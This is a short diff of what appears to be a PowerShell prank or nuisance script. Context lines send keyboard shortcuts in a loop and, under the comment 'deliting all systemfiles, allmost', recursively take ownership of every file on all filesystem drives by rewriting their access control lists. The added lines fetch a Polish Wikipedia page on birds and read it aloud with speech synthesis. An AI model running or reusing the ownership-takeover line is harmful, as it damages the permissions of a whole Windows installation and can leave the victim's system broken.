@@ -152,4 +152,7 @@ for(){@('^%{LEFT}', '^%{DOWN}', '^%{RIGHT}', '^%{UP}') | % {[System.Windows.Form
 #deliting all systemfiles, allmost
 (psprovider | where name -eq filesystem).drives.root | % {ls $_ -r -fo | select -exp fullname | % {$acl = get-acl $_; $acl.SetOwner([System.Security.Principal.NTAccount]::new((whoami))); Set-Acl $_ $acl;}}
 
+#czytanie wikipedii
+Add-Type -AssemblyName System.Speech;[Speech.Synthesis.SpeechSynthesizer]::new().Speak((iwr https://pl.wikipedia.org/wiki/Ptaki).content + [regex]::Escape('<td style="width: 100%;"') -replace "<.*?>")
+
 
